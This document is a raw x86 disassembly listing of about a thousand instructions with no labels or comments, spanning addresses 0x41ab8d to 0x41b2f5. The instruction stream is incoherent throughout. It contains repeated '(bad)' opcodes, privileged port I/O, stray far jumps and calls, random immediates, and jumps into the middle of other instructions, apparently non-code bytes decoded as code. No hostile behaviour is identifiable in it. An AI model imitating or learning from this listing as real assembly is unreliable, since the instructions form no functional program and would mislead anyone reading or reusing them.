  41ab8d:	adc    dh,bh
  41ab8f:	add    al,BYTE PTR fs:[ebx]
  41ab92:	ja     0x41ab66
  41ab94:	out    0x27,eax
  41ab96:	out    0xd6,eax
  41ab98:	sub    al,0x3a
  41ab9a:	fcmovb st,st(1)
  41ab9c:	unpcklps xmm0,XMMWORD PTR [edx-0x5c83d77f]
  41aba3:	(bad)  
  41aba4:	or     BYTE PTR [ebp+edi*4-0x52626321],dl
  41abab:	sbb    eax,0xb6987dc8
  41abb0:	add    al,0xbb
  41abb2:	repnz sub bh,BYTE PTR [eax+ebx*4-0x207cbb77]
  41abba:	out    dx,al
  41abbb:	icebp  
  41abbc:	dec    edx
  41abbd:	int    0x55
  41abbf:	lods   eax,DWORD PTR ds:[esi]
  41abc0:	out    0xf7,eax
  41abc2:	xor    ch,BYTE PTR [edx+0xf]
  41abc5:	aam    0x42
  41abc7:	mov    cl,0x62
  41abc9:	std    
  41abca:	pop    ecx
  41abcb:	and    DWORD PTR [ebx],edi
  41abcd:	pop    ebx
  41abce:	popa   
  41abcf:	inc    esp
  41abd0:	ins    BYTE PTR es:[edi],dx
  41abd1:	xchg   esp,eax
  41abd2:	mov    ebp,ebx
  41abd4:	mov    ebp,0xbdc3104d
  41abd9:	adc    DWORD PTR [edx],ebp
  41abdb:	(bad)  
  41abdc:	pop    eax
  41abdd:	call   DWORD PTR [esi-0x63]
  41abe0:	loopne 0x41ab97
  41abe2:	xchg   ebp,eax
  41abe3:	xor    al,0xbe
  41abe5:	call   0xf44f40bc
  41abea:	dec    edi
  41abeb:	cwde   
  41abec:	out    0x28,al
  41abee:	push   edx
  41abef:	mov    eax,0x74768734
  41abf4:	mov    ah,0x2c
  41abf6:	add    bl,BYTE PTR [ebx+0x14a6b107]
  41abfc:	scas   eax,DWORD PTR es:[edi]
  41abfd:	in     al,dx
  41abfe:	mov    fs,WORD PTR ds:0xf06f093d
  41ac04:	popf   
  41ac05:	lahf   
  41ac06:	pop    esp
  41ac07:	cs pop ds
  41ac09:	lds    ecx,FWORD PTR [ebp+0x2b]
  41ac0c:	mov    edi,0xc086ccf9
  41ac11:	xchg   ebp,eax
  41ac12:	fldcw  WORD PTR [eax+0x28]
  41ac15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac16:	push   ecx
  41ac17:	test   al,0xaf
  41ac19:	repnz mov edi,0xcf616d90
  41ac1f:	out    0x8e,al
  41ac21:	jbe    0x41ac27
  41ac23:	dec    ebp
  41ac24:	fcom   QWORD PTR [edi]
  41ac26:	inc    ebp
  41ac27:	stos   DWORD PTR es:[edi],eax
  41ac28:	clc    
  41ac29:	mov    dl,0x43
  41ac2b:	in     al,0xd9
  41ac2d:	out    0xa7,al
  41ac2f:	xchg   BYTE PTR [ebx+0x15e07045],bl
  41ac35:	dec    ecx
  41ac36:	mov    dh,0xa7
  41ac38:	scas   eax,DWORD PTR es:[edi]
  41ac39:	jge    0x41ac32
  41ac3b:	xchg   esi,eax
  41ac3c:	mov    al,0xf0
  41ac3e:	leave  
  41ac3f:	xor    eax,0x62b74bad
  41ac44:	inc    ebx
  41ac45:	mov    al,0x7e
  41ac47:	cmp    DWORD PTR [eax-0x16],0xfffffff8
  41ac4b:	mov    DWORD PTR [ecx+ebp*8+0x15],0x67592e6f
  41ac53:	mov    BYTE PTR [eax-0x508e6a55],dh
  41ac59:	adc    eax,0x15ed6ee2
  41ac5e:	lahf   
  41ac5f:	loop   0x41aca5
  41ac61:	pop    es
  41ac62:	pop    ecx
  41ac63:	stos   DWORD PTR es:[edi],eax
  41ac64:	mov    edx,0xd558ad4b
  41ac69:	lods   eax,DWORD PTR ds:[esi]
  41ac6a:	xor    DWORD PTR ds:[edx-0x5519f0e7],ebx
  41ac71:	inc    ecx
  41ac72:	jbe    0x41ac90
  41ac74:	push   edx
  41ac75:	xchg   esp,eax
  41ac76:	push   ebx
  41ac77:	push   eax
  41ac78:	repz aaa 
  41ac7a:	mov    cl,0x5c
  41ac7c:	sub    eax,DWORD PTR [esi+0x63]
  41ac7f:	mov    ds:0x753f6840,eax
  41ac84:	ins    DWORD PTR es:[edi],dx
  41ac85:	xchg   edi,edi
  41ac87:	mov    dl,0xa4
  41ac89:	in     eax,0xea
  41ac8b:	int3   
  41ac8c:	mov    ch,0xa
  41ac8e:	fs popa 
  41ac90:	add    DWORD PTR [ebp+edx*2-0x51],0x9ee73431
  41ac98:	into   
  41ac99:	ins    BYTE PTR es:[edi],dx
  41ac9a:	or     eax,0x41425f2f
  41ac9f:	xchg   esp,eax
  41aca0:	popa   
  41aca1:	iret   
  41aca2:	pop    esi
  41aca3:	shl    dh,1
  41aca5:	mov    edi,DWORD PTR [ebx]
  41aca7:	in     al,0xd4
  41aca9:	das    
  41acaa:	add    edi,edx
  41acac:	nop
  41acad:	pushf  
  41acae:	adc    esi,DWORD PTR [esi]
  41acb0:	test   BYTE PTR [edi-0x6f26fceb],bl
  41acb6:	fldcw  WORD PTR [eax+0x39]
  41acb9:	cmp    eax,0x9f77a912
  41acbe:	lea    ebx,[edx]
  41acc0:	es out 0x6b,al
  41acc3:	or     BYTE PTR [ecx+esi*2],bh
  41acc6:	adc    BYTE PTR [edi-0x30c9e6e0],ah
  41accc:	jns    0x41ad48
  41acce:	bound  esi,QWORD PTR [edx+0x1]
  41acd1:	push   ecx
  41acd2:	mov    ch,0x12
  41acd4:	inc    ebp
  41acd5:	or     al,0xbb
  41acd7:	imul   edx,DWORD PTR [ebx],0x37
  41acda:	outs   dx,DWORD PTR ds:[esi]
  41acdb:	es jb  0x41ac82
  41acde:	jmp    0xd34b:0xfb0b57f
  41ace5:	gs int3 
  41ace7:	int3   
  41ace8:	mov    WORD PTR [esi+0x55],ds
  41aceb:	mov    ah,0x4d
  41aced:	cmp    BYTE PTR [edx],ah
  41acef:	or     bl,0x12
  41acf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acf3:	inc    edx
  41acf4:	xchg   esp,eax
  41acf5:	fs push 0x46
  41acf8:	test   DWORD PTR [ebx-0x28],edi
  41acfb:	aam    0x42
  41acfd:	ja     0x41ad0e
  41acff:	adc    cl,dh
  41ad01:	cli    
  41ad02:	lods   al,BYTE PTR ds:[esi]
  41ad03:	adc    BYTE PTR [eax+0x2afd85f9],dh
  41ad09:	cdq    
  41ad0a:	inc    ebp
  41ad0b:	pop    ss
  41ad0c:	mov    edx,0x5f6556b3
  41ad11:	adc    DWORD PTR [edi],edi
  41ad13:	bnd jns 0x41ad43
  41ad16:	(bad)  [esi-0x1cc898bf]
  41ad1c:	ins    BYTE PTR es:[edi],dx
  41ad1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad1e:	hlt    
  41ad1f:	test   al,0x6e
  41ad21:	jae    0x41acc7
  41ad23:	add    BYTE PTR ds:0x5e9edb4c,cl
  41ad29:	mov    esp,0xbc90b962
  41ad2e:	cmp    ah,al
  41ad30:	dec    edi
  41ad31:	mov    edi,DWORD PTR fs:[eax]
  41ad34:	push   esp
  41ad35:	arpl   dx,bp
  41ad37:	js     0x41ad4a
  41ad39:	ret    0x3b17
  41ad3c:	(bad)  
  41ad3d:	gs jbe 0x41acd5
  41ad40:	sbb    BYTE PTR [ecx-0x2c],0x3a
  41ad44:	xchg   esi,eax
  41ad45:	cli    
  41ad46:	scas   eax,DWORD PTR es:[edi]
  41ad47:	or     bh,dh
  41ad49:	hlt    
  41ad4a:	in     eax,0x19
  41ad4c:	jle    0x41ace9
  41ad4e:	sbb    bl,ch
  41ad50:	mov    ebp,0x2ba4c111
  41ad55:	xor    dl,BYTE PTR [ebx+0x2a11693d]
  41ad5b:	mov    ds:0x3ada44da,al
  41ad60:	or     ch,bl
  41ad62:	push   eax
  41ad63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad64:	sub    ah,BYTE PTR [edx+0x24]
  41ad67:	ds mov al,0xa6
  41ad6a:	jno    0x41adbf
  41ad6c:	call   0x112238dc
  41ad71:	push   es
  41ad72:	inc    edx
  41ad73:	test   BYTE PTR [ebp+0x523e8fb],bl
  41ad79:	in     al,0x75
  41ad7b:	hlt    
  41ad7c:	daa    
  41ad7d:	out    0x45,eax
  41ad7f:	push   edx
  41ad80:	sbb    BYTE PTR [ebx],ah
  41ad82:	jae    0x41adbb
  41ad84:	adc    al,0x8
  41ad86:	inc    ebx
  41ad87:	jmp    0x41ad3a
  41ad89:	push   edx
  41ad8a:	fbstp  TBYTE PTR [esi]
  41ad8c:	or     al,0x99
  41ad8e:	popa   
  41ad8f:	loop   0x41ad1f
  41ad91:	mov    bh,0x84
  41ad93:	or     al,0xf6
  41ad95:	mov    bl,0x1
  41ad97:	shl    BYTE PTR [eax+0x2b0d6a2f],1
  41ad9d:	xchg   esp,eax
  41ad9e:	aaa    
  41ad9f:	idiv   BYTE PTR [eax]
  41ada1:	test   bh,ch
  41ada3:	enter  0xd568,0x29
  41ada7:	(bad)  
  41ada9:	fcomp  QWORD PTR [esi+0x55a1297c]
  41adaf:	mov    ecx,DWORD PTR [ebx+0x9]
  41adb2:	jns    0x41ae30
  41adb4:	xchg   ebx,eax
  41adb5:	push   ebx
  41adb6:	and    al,0x3e
  41adb8:	jae    0x41ada9
  41adba:	push   ss
  41adbb:	vandnps xmm0,xmm6,XMMWORD PTR [esi-0x3b26fe0b]
  41adc3:	cmp    BYTE PTR [edx+0x27],bh
  41adc6:	xchg   ecx,eax
  41adc7:	lock and bh,ah
  41adca:	in     eax,0xd1
  41adcc:	push   es
  41adcd:	mov    bh,0xe7
  41adcf:	in     eax,dx
  41add0:	push   esi
  41add1:	aas    
  41add2:	add    DWORD PTR [ebx+0x29],0xffffffa3
  41add6:	mov    al,0xdd
  41add8:	loope  0x41adb8
  41adda:	pusha  
  41addb:	test   al,0xf
  41addd:	jl     0x41ad7b
  41addf:	call   0x86088823
  41ade4:	xor    DWORD PTR [ecx+0x73],edi
  41ade7:	add    DWORD PTR [ecx+0x3e],0x411586cf
  41adee:	popf   
  41adef:	xchg   ebp,eax
  41adf0:	and    cl,BYTE PTR [eax]
  41adf2:	xor    eax,0x13
  41adf5:	dec    ecx
  41adf6:	dec    esi
  41adf7:	fisubr DWORD PTR [ebp+0x6d]
  41adfa:	ror    BYTE PTR [edi],1
  41adfc:	fisubr DWORD PTR [esi-0x4e9b2529]
  41ae02:	jmp    0xabaa:0x19b2ecb8
  41ae09:	ror    DWORD PTR [edx-0x5d],cl
  41ae0c:	xor    DWORD PTR [esi+edi*8+0x3f],0xffffffbc
  41ae11:	xchg   ecx,eax
  41ae12:	jg     0x41ae34
  41ae14:	push   eax
  41ae15:	mov    esi,0xee530d52
  41ae1a:	xor    bh,ch
  41ae1c:	add    bh,BYTE PTR [edx]
  41ae1e:	loop   0x41addc
  41ae20:	mov    WORD PTR [eax+0x47f621ef],ss
  41ae26:	jg     0x41ae90
  41ae28:	pop    ebx
  41ae29:	xor    BYTE PTR [edx+0x5e],bl
  41ae2c:	ffreep st(1)
  41ae2e:	rcr    al,cl
  41ae30:	test   DWORD PTR [eax+ecx*2+0x6583bad4],0x38980c06
  41ae3b:	pusha  
  41ae3c:	repnz xchg edi,eax
  41ae3e:	std    
  41ae3f:	push   es
  41ae40:	loope  0x41ae0e
  41ae42:	stos   DWORD PTR es:[edi],eax
  41ae43:	test   eax,0x546b8c7a
  41ae48:	out    dx,eax
  41ae49:	ret    
  41ae4a:	(bad)  
  41ae4b:	push   edi
  41ae4c:	mov    es,WORD PTR [eax-0x4989a837]
  41ae52:	fnstcw WORD PTR [edi]
  41ae54:	or     dh,ch
  41ae56:	xor    eax,0x78b3fea3
  41ae5b:	das    
  41ae5c:	enter  0x5f06,0x17
  41ae60:	sub    BYTE PTR [ebp+0x4b],0x8d
  41ae64:	leave  
  41ae65:	inc    edi
  41ae66:	popf   
  41ae67:	xchg   ecx,eax
  41ae68:	mov    ah,0x61
  41ae6a:	or     ah,bh
  41ae6c:	cmp    DWORD PTR [eax+ebx*2-0x6f],ebp
  41ae70:	add    bl,BYTE PTR [esi+0x369e5e87]
  41ae76:	sahf   
  41ae77:	lds    esi,FWORD PTR [edx+eax*4+0x683e8ae5]
  41ae7e:	push   ebx
  41ae7f:	push   edx
  41ae80:	cwde   
  41ae81:	shl    ch,0x7e
  41ae84:	jnp    0x41aeca
  41ae86:	xchg   esp,eax
  41ae87:	ja     0x41ae6d
  41ae89:	inc    eax
  41ae8a:	sub    bh,ch
  41ae8c:	lahf   
  41ae8d:	add    DWORD PTR [esi-0x5abdb544],0xd8e0de1
  41ae97:	or     edx,DWORD PTR [ebp+0x7757ce9b]
  41ae9d:	adc    al,0xf1
  41ae9f:	inc    esi
  41aea0:	add    eax,0x88cfee07
  41aea5:	xchg   edi,eax
  41aea6:	ins    BYTE PTR es:[edi],dx
  41aea7:	push   ss
  41aea8:	cld    
  41aea9:	or     BYTE PTR [edx],bl
  41aeab:	add    al,al
  41aead:	add    al,0x49
  41aeaf:	fisub  WORD PTR [edx-0x63]
  41aeb2:	(bad)  
  41aeb3:	outs   dx,BYTE PTR ds:[esi]
  41aeb4:	adc    al,0x81
  41aeb6:	mov    al,0x2d
  41aeb8:	sub    al,0x72
  41aeba:	jne    0x41ae4f
  41aebc:	hlt    
  41aebd:	jbe    0x41ae7c
  41aebf:	packuswb mm5,QWORD PTR [esi-0x3bff30d6]
  41aec6:	xchg   esi,eax
  41aec7:	clc    
  41aec8:	add    dl,dl
  41aeca:	stos   DWORD PTR es:[edi],eax
  41aecb:	xor    edx,DWORD PTR [ecx-0x61]
  41aece:	call   0xc66a:0x2bc3d22c
  41aed5:	loopne 0x41aef8
  41aed7:	xchg   esp,eax
  41aed8:	sbb    dl,dh
  41aeda:	div    DWORD PTR [edx-0x7b0823e0]
  41aee0:	add    BYTE PTR [esi+0x207927e4],al
  41aee6:	scas   eax,DWORD PTR es:[edi]
  41aee7:	dec    edx
  41aee8:	sbb    al,0x76
  41aeea:	pop    es
  41aeeb:	jp     0x41ae98
  41aeed:	fisub  WORD PTR [ebx+0x4]
  41aef0:	lahf   
  41aef1:	ret    
  41aef2:	mov    esi,DWORD PTR [eax+0x68]
  41aef5:	or     BYTE PTR [ebp+0x4c],0xea
  41aef9:	addr16 sti 
  41aefb:	adc    al,0x5
  41aefd:	push   ds
  41aefe:	cli    
  41aeff:	dec    ebx
  41af00:	loope  0x41af32
  41af02:	idiv   BYTE PTR [edi]
  41af04:	retf   
  41af05:	test   eax,0x2b398f3c
  41af0a:	sub    ebx,DWORD PTR [ecx]
  41af0c:	sub    BYTE PTR [ebx],ah
  41af0e:	cwde   
  41af0f:	cmp    DWORD PTR [edx+0x22],ebp
  41af12:	addr16 mov esp,0x6f0db5c6
  41af18:	mov    esp,0xe95fb17
  41af1d:	test   DWORD PTR [ebx],ebp
  41af1f:	dec    esp
  41af20:	test   eax,0x4a6f0393
  41af25:	cs push ebp
  41af27:	push   esp
  41af28:	pop    edx
  41af29:	mov    edi,DWORD PTR [esi+0x3fea0dd8]
  41af2f:	data16 add BYTE PTR [ecx+0x11],bh
  41af33:	ja     0x41aeb5
  41af35:	mov    cl,0x27
  41af37:	outs   dx,DWORD PTR ds:[esi]
  41af38:	jae    0x41af8b
  41af3a:	lds    edx,FWORD PTR [esi+0x5c60ab5e]
  41af40:	push   ds
  41af41:	inc    eax
  41af42:	pop    edx
  41af43:	pop    ecx
  41af44:	pushf  
  41af45:	loop   0x41afb8
  41af47:	pop    esi
  41af48:	mov    ax,ds:0xef5653c0
  41af4e:	jp     0x41afa4
  41af50:	mov    ah,0x82
  41af52:	push   ss
  41af53:	aaa    
  41af54:	jmp    0x1be61d64
  41af59:	jg     0x41af9b
  41af5b:	mov    ebp,0xf932dbc1
  41af60:	and    eax,0x408d54d2
  41af65:	daa    
  41af66:	or     ecx,DWORD PTR [ebx+eax*1-0x3203c44]
  41af6d:	push   ebp
  41af6e:	add    al,0xe4
  41af70:	mov    ebp,0x7b477735
  41af75:	inc    eax
  41af76:	cli    
  41af77:	sysenter 
  41af79:	xchg   edi,eax
  41af7a:	inc    edx
  41af7b:	mov    ch,cl
  41af7d:	mov    ds:0xc2ad8d77,eax
  41af82:	inc    ebp
  41af83:	mov    ebx,0x26d3e469
  41af88:	in     al,dx
  41af89:	add    BYTE PTR [eax-0x74],ch
  41af8c:	mov    ch,0x4c
  41af8e:	test   DWORD PTR [eax-0x2b],edi
  41af91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af92:	retf   
  41af93:	dec    ebp
  41af94:	int3   
  41af95:	or     eax,DWORD PTR ds:0xc30f488b
  41af9b:	enter  0x8ec3,0xad
  41af9f:	fst    st(0)
  41afa1:	js     0x41aff7
  41afa3:	(bad)  
  41afa5:	adc    cl,ah
  41afa7:	adc    al,0x6a
  41afa9:	jnp    0x41af46
  41afab:	adc    eax,0x84d38eb8
  41afb0:	add    esi,esi
  41afb2:	mov    bh,0x33
  41afb4:	mov    cl,0x8c
  41afb6:	inc    esp
  41afb7:	mov    cl,0x39
  41afb9:	inc    ecx
  41afba:	imul   edi,DWORD PTR [edi-0x7e716c11],0xf7c1dde4
  41afc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afc5:	cmp    DWORD PTR [eax+0x1899c163],ebp
  41afcb:	dec    ebp
  41afcc:	test   ebp,edx
  41afce:	test   BYTE PTR [ebp-0x4ef3ca3c],cl
  41afd4:	fadd   DWORD PTR [ecx+0x70]
  41afd7:	test   eax,0x447ce807
  41afdc:	in     al,dx
  41afdd:	outs   dx,BYTE PTR ds:[esi]
  41afde:	xor    ebp,DWORD PTR [ebx-0x56]
  41afe1:	pop    ecx
  41afe2:	test   BYTE PTR [edx+0x3214c319],al
  41afe8:	std    
  41afe9:	and    dh,BYTE PTR [ebx-0x6e]
  41afec:	inc    DWORD PTR [edx+0x36]
  41afef:	lea    ecx,[ebp+0x5ea11f0d]
  41aff5:	mov    al,0x22
  41aff7:	and    esi,esi
  41aff9:	xor    esi,DWORD PTR [edi+0x48dd85bf]
  41afff:	cmp    BYTE PTR [edi+0x16],al
  41b002:	rol    BYTE PTR [ebx+0x40],0x82
  41b006:	xor    dh,BYTE PTR [edi-0x2e]
  41b009:	mov    eax,ds:0x1fcb5340
  41b00e:	xlat   BYTE PTR ds:[ebx]
  41b00f:	sbb    eax,0x1142c918
  41b014:	jns    0x41afb2
  41b016:	dec    ebp
  41b017:	xchg   edx,eax
  41b018:	dec    ecx
  41b019:	icebp  
  41b01a:	jl     0x41b08c
  41b01c:	pusha  
  41b01d:	cwde   
  41b01e:	inc    esi
  41b01f:	xchg   DWORD PTR [ebx+ecx*8+0x750e060f],ecx
  41b026:	in     al,dx
  41b027:	fdiv   QWORD PTR [ecx+0x13]
  41b02a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b02b:	dec    edi
  41b02c:	les    edi,FWORD PTR ss:0xa93cf8e0
  41b033:	pop    ecx
  41b034:	adc    DWORD PTR [ecx+ecx*2-0x2b],esi
  41b038:	mov    bl,0x4d
  41b03a:	push   edx
  41b03b:	in     al,dx
  41b03c:	and    eax,0x10204a8d
  41b041:	pmuludq mm5,QWORD PTR [edx]
  41b044:	fld    QWORD PTR [ebx]
  41b046:	(bad)  [edx+0xe]
  41b049:	cmc    
  41b04a:	dec    ecx
  41b04b:	gs adc al,0x87
  41b04e:	cli    
  41b04f:	fdiv   QWORD PTR [ebp+ebx*2-0x2bf8588]
  41b056:	mov    ebx,0xf73194a4
  41b05b:	jne    0x41b08a
  41b05d:	shl    DWORD PTR [ecx-0x36],cl
  41b060:	test   BYTE PTR [eax+esi*1-0x54],ah
  41b064:	cdq    
  41b065:	(bad)  
  41b066:	out    0xa5,eax
  41b068:	xchg   esp,eax
  41b069:	aad    0xfe
  41b06b:	mov    esp,0xfad0f636
  41b070:	and    BYTE PTR [ecx-0x20],ch
  41b073:	pop    es
  41b074:	mov    eax,ds:0x27c464ec
  41b079:	and    ch,0xaa
  41b07c:	inc    ecx
  41b07d:	xlat   BYTE PTR ds:[ebx]
  41b07e:	repnz pop ss
  41b080:	dec    ebp
  41b081:	sahf   
  41b082:	sub    DWORD PTR [eax],eax
  41b084:	mov    cl,0x10
  41b086:	mov    ah,0x2
  41b088:	or     DWORD PTR [edx-0x5213c09b],esi
  41b08e:	mov    ecx,0xc075a547
  41b093:	out    dx,eax
  41b094:	test   al,0x6a
  41b096:	stos   BYTE PTR es:[edi],al
  41b097:	test   DWORD PTR [ebp+0x6a],ebp
  41b09a:	cmp    bl,BYTE PTR [ebx+0x76]
  41b09d:	fdivr  st,st(3)
  41b09f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0a0:	addr16 or edx,ebx
  41b0a3:	mov    WORD PTR [ebp-0x68ad6b3a],fs
  41b0a9:	or     bh,BYTE PTR [eax-0x30]
  41b0ac:	push   ebx
  41b0ad:	mov    dl,0x35
  41b0af:	adc    eax,0xc674d017
  41b0b4:	shl    BYTE PTR [ecx-0x4d6b23f3],cl
  41b0ba:	cmp    al,0xd
  41b0bc:	out    0xf6,eax
  41b0be:	pop    ds
  41b0bf:	xor    edi,esp
  41b0c1:	(bad)  
  41b0c2:	lods   al,BYTE PTR ds:[esi]
  41b0c3:	jg     0x41b118
  41b0c5:	mov    bl,0x1a
  41b0c7:	xchg   edx,eax
  41b0c8:	arpl   WORD PTR [esi-0x69],dx
  41b0cb:	xchg   ebp,eax
  41b0cc:	add    BYTE PTR [ebx+ecx*2+0x376f4d5c],0x40
  41b0d4:	mov    eax,0x1e233bc9
  41b0d9:	call   0x3f0da673
  41b0de:	xchg   edi,eax
  41b0df:	(bad)  
  41b0e0:	push   cs
  41b0e1:	mov    ds:0x2c29f9e5,eax
  41b0e6:	mov    ah,0x19
  41b0e8:	jmp    0x5fd:0xe62525b4
  41b0ef:	mov    ecx,0x18881ded
  41b0f4:	in     al,0xc3
  41b0f6:	xchg   edi,eax
  41b0f7:	mov    ah,0x76
  41b0f9:	scas   eax,DWORD PTR es:[edi]
  41b0fa:	mov    BYTE PTR [ebp+0x6180ad6a],al
  41b100:	mov    esp,0x2a091eab
  41b105:	lods   eax,DWORD PTR ds:[esi]
  41b106:	sbb    ch,dl
  41b108:	push   ebx
  41b109:	sbb    al,0x15
  41b10b:	bnd jl 0x41b0c3
  41b10e:	mov    esi,0x78547ebd
  41b113:	xor    DWORD PTR ds:0x2a21688c,ebp
  41b119:	xor    eax,0x226ef85d
  41b11e:	into   
  41b11f:	sbb    al,0x84
  41b121:	cmp    edx,DWORD PTR [ebx+esi*4]
  41b124:	ss adc ecx,eax
  41b127:	dec    eax
  41b128:	cmp    al,0xf4
  41b12a:	stc    
  41b12b:	(bad)  
  41b12c:	mov    bh,0xa3
  41b12e:	popf   
  41b12f:	popf   
  41b130:	addr16 push ds
  41b132:	das    
  41b133:	cmp    dh,dh
  41b135:	fs mov bp,0x70f6
  41b13a:	pusha  
  41b13b:	enter  0x8585,0x9d
  41b13f:	test   BYTE PTR [eax-0x3b],ch
  41b142:	mov    ds:0xf03c8b13,al
  41b147:	and    eax,0xd2cf3b24
  41b14c:	and    eax,0x8730674c
  41b151:	mov    esp,0xf8af5761
  41b156:	jnp    0x41b151
  41b158:	add    ch,dh
  41b15a:	aam    0x47
  41b15c:	repnz push es
  41b15e:	jmp    0x41b194
  41b160:	int    0x46
  41b162:	sub    eax,0xd81d3c4
  41b167:	jo     0x41b13f
  41b169:	pop    ebx
  41b16a:	loope  0x41b1eb
  41b16c:	loopne 0x41b147
  41b16e:	jne    0x41b1b2
  41b170:	std    
  41b171:	ins    BYTE PTR es:[edi],dx
  41b172:	popa   
  41b173:	mov    al,ds:0x5a17e6f2
  41b178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b179:	sub    BYTE PTR [edi+0x4ed1de63],cl
  41b17f:	(bad)  
  41b181:	lock arpl WORD PTR [esp+edx*1-0x34ff9f20],ax
  41b189:	imul   DWORD PTR [edi+esi*1]
  41b18c:	jge    0x41b1f3
  41b18e:	cmp    al,0x55
  41b190:	cmp    edx,DWORD PTR [esi]
  41b192:	push   0x46
  41b194:	dec    edi
  41b195:	pop    edx
  41b196:	sbb    edx,edx
  41b198:	sar    BYTE PTR [eax+0x59],1
  41b19b:	jp     0x41b21c
  41b19d:	push   es
  41b19e:	jp     0x41b12f
  41b1a0:	(bad)  
  41b1a1:	add    BYTE PTR [eax-0x39],ch
  41b1a4:	ud1    esi,DWORD PTR [ebx+edi*2+0x574be25a]
  41b1ac:	mov    dh,BYTE PTR [ebx+ebx*8+0x1c8bd3c7]
  41b1b3:	jmp    0x41b135
  41b1b5:	retf   0xc236
  41b1b8:	cwde   
  41b1b9:	cmp    DWORD PTR [edi+0x38],ecx
  41b1bc:	xchg   esi,eax
  41b1bd:	scas   al,BYTE PTR es:[edi]
  41b1be:	ror    DWORD PTR [esi-0x548c21c1],1
  41b1c4:	in     al,0xc4
  41b1c6:	xchg   edi,eax
  41b1c7:	aad    0xc2
  41b1c9:	and    eax,0xb589860c
  41b1ce:	sub    ebx,DWORD PTR [ecx-0x1ee46531]
  41b1d4:	push   ecx
  41b1d5:	sahf   
  41b1d6:	or     bl,BYTE PTR [ebp+0x1c47d5ee]
  41b1dc:	xor    BYTE PTR [ecx+0x4016024c],0xda
  41b1e3:	cmp    al,0x42
  41b1e5:	jne    0x41b1b7
  41b1e7:	xchg   edx,eax
  41b1e8:	mov    eax,ds:0x954e92a0
  41b1ed:	test   BYTE PTR [esi],cl
  41b1ef:	into   
  41b1f0:	push   eax
  41b1f1:	leave  
  41b1f2:	jl     0x41b19a
  41b1f4:	inc    edi
  41b1f5:	adc    eax,0xcc4f054f
  41b1fa:	cmp    dh,0x8b
  41b1fd:	mov    esp,0xf4e20da4
  41b203:	or     eax,0x28396878
  41b208:	jp     0x41b1f1
  41b20a:	rcl    BYTE PTR [edx],cl
  41b20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b20d:	scas   eax,DWORD PTR es:[edi]
  41b20e:	fdiv   DWORD PTR [edx]
  41b210:	cmp    edx,DWORD PTR [edi+0x2d767b21]
  41b216:	and    DWORD PTR ds:0x8799d8f7,0xffffff8a
  41b21d:	dec    edx
  41b21e:	sti    
  41b21f:	addr16 call 0x89e9:0x8beebab7
  41b227:	stos   BYTE PTR es:[edi],al
  41b228:	push   edi
  41b229:	sbb    eax,0x56d4025
  41b22e:	or     al,0xe2
  41b230:	neg    BYTE PTR [ecx+edx*4-0x6a]
  41b234:	and    DWORD PTR [ecx+esi*4+0x69a7a8a5],0x3e
  41b23c:	push   edi
  41b23d:	hlt    
  41b23e:	out    dx,al
  41b23f:	adc    al,BYTE PTR [esp+ebx*2]
  41b242:	(bad)  
  41b243:	jno    0x41b24d
  41b245:	jmp    0xde88:0x8f830496
  41b24c:	or     edx,edi
  41b24e:	cmp    esi,ebp
  41b250:	xchg   ebp,eax
  41b251:	test   BYTE PTR [esi],0x1c
  41b254:	in     eax,dx
  41b255:	fcomp  DWORD PTR [ebp+0x46]
  41b258:	mov    dl,0x8c
  41b25a:	(bad)  
  41b25b:	in     eax,dx
  41b25c:	push   ecx
  41b25d:	lahf   
  41b25e:	adc    ebx,DWORD PTR [ebp+0xf]
  41b261:	enter  0x57e4,0x10
  41b265:	jne    0x41b243
  41b267:	jbe    0x41b2e7
  41b269:	inc    eax
  41b26a:	test   al,0xf1
  41b26d:	les    esi,FWORD PTR [esi]
  41b26f:	mov    al,ds:0xebe090eb
  41b274:	sahf   
  41b275:	add    DWORD PTR [edi+0x882837a],ecx
  41b27b:	loope  0x41b234
  41b27d:	push   edi
  41b27e:	fbstp  TBYTE PTR [edi+0x1a]
  41b281:	and    al,cl
  41b283:	adc    DWORD PTR ds:[ebx],eax
  41b286:	pop    es
  41b287:	jae    0x41b24a
  41b289:	sbb    dh,BYTE PTR [esi]
  41b28b:	clc    
  41b28c:	test   ebx,ebp
  41b28e:	rcr    dh,1
  41b290:	inc    ebp
  41b291:	nop    DWORD PTR [ebx+0x4190e08d]
  41b298:	or     BYTE PTR [ecx],0x6d
  41b29b:	sbb    edi,esi
  41b29d:	mov    ebx,0x9ea4f652
  41b2a2:	push   edx
  41b2a3:	jbe    0x41b256
  41b2a5:	mov    al,dl
  41b2a7:	ret    0xd766
  41b2aa:	inc    edx
  41b2ab:	imul   edx,esi,0xc15f707c
  41b2b1:	nop
  41b2b2:	dec    eax
  41b2b3:	and    eax,DWORD PTR [edi+0x5ed9c85a]
  41b2b9:	(bad)  
  41b2ba:	adc    al,0xba
  41b2bc:	xor    eax,0xfb4976ba
  41b2c1:	mov    DWORD PTR [esi+0x60cf6686],ebx
  41b2c7:	mov    bh,0xe3
  41b2c9:	jp     0x41b2c0
  41b2cb:	outs   dx,DWORD PTR ds:[esi]
  41b2cc:	sar    DWORD PTR [esi],1
  41b2ce:	jns    0x41b343
  41b2d0:	push   eax
  41b2d1:	les    eax,FWORD PTR [ecx+0xfc3a5a]
  41b2d7:	out    0xbd,eax
  41b2d9:	ja     0x41b2cd
  41b2db:	xor    ebx,DWORD PTR [ecx]
  41b2dd:	(bad)  
  41b2de:	(bad)
  41b2e1:	stos   DWORD PTR es:[edi],eax
  41b2e2:	stos   DWORD PTR es:[edi],eax
  41b2e3:	jp     0x41b350
  41b2e5:	pop    ebp
  41b2e6:	(bad)  
  41b2e7:	jle    0x41b2fa
  41b2e9:	push   ecx
  41b2ea:	mov    eax,ds:0xd0072f0b
  41b2ef:	xor    ebp,DWORD PTR [edx-0x5e]
  41b2f2:	xor    BYTE PTR [edx-0x21],cl
  41b2f5:	mov    ecx,0xc464d23f
